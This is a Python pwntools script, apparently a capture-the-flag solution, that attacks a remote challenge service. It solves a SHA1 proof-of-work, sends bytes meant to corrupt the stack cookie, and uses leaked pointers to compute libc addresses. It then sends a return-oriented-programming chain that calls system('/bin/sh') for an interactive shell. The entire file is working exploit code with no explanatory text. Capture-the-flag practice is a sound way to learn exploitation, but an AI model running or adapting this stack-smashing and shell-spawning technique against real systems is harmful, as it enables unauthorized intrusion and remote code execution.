#!/usr/bin/env python3
from pwn import *
from hashlib import sha1
if args['REMOTE']:
    p = remote('hitme.tasteless.eu', 10801)
    l = p.recvline().strip()
    m = re.match(br'^sha1\((.+), input\) prefix = (0+)...$', l)
    assert m is not None
    prefix, zeroes = m.groups()
    i = 0
    while not sha1(prefix + str(i).encode()).hexdigest().encode().startswith(zeroes):
        i += 1
    p.sendline(str(i))
else:
    p = remote('localhost', 10801)
p.recvuntil('All your shellcode are belong to us')
p.send(b'\x64\x48\x21\x1b\x90')  # and %rbx,%fs:(%rbx); nop -> fsck cookie
p.recvuntil('yay, you didn\'t crash this thing! Have a pointer, you may need it: ')
system_ptr = int(p.recvline().decode().strip(), 0)
p.recvuntil('You shouldn\'t need this pointer, but this is an easy challenge:')
rop_ptr = int(p.recvline().decode().strip(), 0)

libc_ptr = system_ptr - 0x0000000000123ef0
pop_rdi_ret_ptr = libc_ptr + 0x00000000000a1c3f
rop = b''.join((
    b'/bin/sh\0',  # ropmebaby[0x00] rbp-0x20
    b'\0' * 8,  # ropmebaby[0x08] rbp-0x18
    b'\0' * 8,  # ropmebaby[0x10] rbp-0x10
    b'\0' * 8,  # cookie          rbp-0x08
    b'\0' * 8,  # rbp             rbp+0x00
    struct.pack('<Q', pop_rdi_ret_ptr),
    struct.pack('<Q', rop_ptr),
    struct.pack('<Q', system_ptr),
))

p.recvuntil('How much is the fish?')
p.sendline(str(len(rop)))
p.recvuntil('Okay, gimme your')
p.send(rop)
p.interactive()
